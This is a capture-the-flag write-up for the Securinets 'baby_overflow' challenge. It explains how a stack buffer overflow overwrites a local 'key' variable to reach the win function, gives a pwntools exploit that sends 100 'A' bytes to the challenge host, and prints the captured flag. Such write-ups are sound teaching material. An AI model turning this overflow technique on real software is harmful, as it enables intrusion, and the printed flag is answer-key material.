# baby_overflow - writeup

## description

![Alt text](img/1.png)

## binary information

```
$ file main
```

![Alt text](img/2.png)

```
$ pwn checksec main
```

![Alt text](img/3.png)

## Solution

In this task we are given the source code for the challenge, the program is comparing the local variable `key` with `0x1337`, if they are equal we won't get the flag else `win` function is called and the flag is printed.

![Alt text](img/4.png)

So in order to solve the challenge we should exploit the buffer overflow vulnerability to corrupt the value of the local variable `key` and get our flag.

## exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template main --host pwn.ctf-friendly.securinets.tn --port 1339
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwn.ctf-friendly.securinets.tn'
port = int(args.PORT or 1339)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.recvline(b'> ')
io.sendline(b'A' * 100)

io.interactive()


```

## exploit output

![Alt text](img/5.png)

## flag

```
SecuriNets{st4ck_r3writ3_k3y_fl49}
```
